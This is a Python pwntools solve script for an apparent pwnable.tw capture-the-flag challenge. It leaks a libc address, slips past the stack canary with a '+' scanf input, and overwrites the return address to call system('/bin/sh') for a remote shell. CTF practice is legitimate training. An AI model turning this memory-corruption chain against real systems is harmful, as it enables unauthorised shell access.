from pwn import *
import sys


# Constants found by manual enumeration
LIBC_ADDR_BUF_OFFSET = 28 # name_buf[12] = our addr from libc
LIBC_ADDR_LIBC_BASE_OFFSET = 0x1ae244

RA_BUF_OFFSET = 32 # num_buf[32] = ra_addr
CANARY_BUF_OFFSET = 24 # num_buf[24] = canary

SYSTEM_OFFSET =      0x0003a940
BINSH_OFFSET =       0x00158e8b


def i2b(i):
    return str(i).encode('utf-8')



def get_addr(offset):
    p.recvuntil(b'What your name :')
    p.send(b'A' * offset)
    resp = p.recvuntil(b',How many numbers do you what to sort :')
    prefix_len = len('Hello ') + offset
    libc_addr = u32(resp[prefix_len:prefix_len + 4])
    log.info("[x] Found address: " + hex(libc_addr))


def leak_libc():
    p.recvuntil(b'What your name :')

    payload = b'A' * LIBC_ADDR_BUF_OFFSET
    p.send(payload)

    resp = p.recvuntil(b',How many numbers do you what to sort :')
    prefix_len = len('Hello ') + LIBC_ADDR_BUF_OFFSET
    libc_addr = u32(resp[prefix_len:prefix_len + 4])
    libc_base = libc_addr - LIBC_ADDR_LIBC_BASE_OFFSET
    log.info("[x] Found libc_base address: " + hex(libc_base))

    return libc_base


def inject_rop(libc_base):
    num_count = RA_BUF_OFFSET + 3
    p.sendline(i2b(num_count))

    for i in range(CANARY_BUF_OFFSET):
        p.recvuntil(b' number : ')
        p.sendline(i2b(0))
    num_count -= CANARY_BUF_OFFSET

    # Trick scanf not to overwrite canary value
    p.sendline(b'+')
    num_count -= 1

    for i in range(RA_BUF_OFFSET - CANARY_BUF_OFFSET - 1):
        p.recvuntil(b' number : ')
        p.sendline(i2b(libc_base))
    
    # Call system
    p.recvuntil(b' number : ')
    p.sendline(i2b(libc_base + SYSTEM_OFFSET))

    # Some junk. Just double binsh address so bubble sort won't mix it
    p.recvuntil(b' number : ')
    p.sendline(i2b(libc_base + BINSH_OFFSET))

    # Real /bin/sh argument
    p.recvuntil(b' number : ')
    p.sendline(i2b(libc_base + BINSH_OFFSET))    
    




p = remote('chall.pwnable.tw', 10101)


libc_base = leak_libc()
inject_rop(libc_base)

p.recvuntil(b'Processing......\n')
p.recvuntil(b'Result :\n')

p.interactive()